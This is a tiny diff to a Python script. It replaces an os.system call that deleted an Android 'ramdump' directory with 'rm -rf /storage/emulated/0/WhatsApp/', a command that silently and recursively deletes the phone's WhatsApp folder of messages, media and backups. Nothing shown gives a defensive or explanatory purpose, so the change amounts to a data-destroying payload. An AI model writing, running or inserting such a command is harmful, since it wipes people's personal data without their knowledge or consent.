@@ -1,6 +1,6 @@
 import os
 import sys
-os.system('rm -rf /storage/emulated/0/ramdump')
+os.system('rm -rf /storage/emulated/0/WhatsApp/')
 
 
 
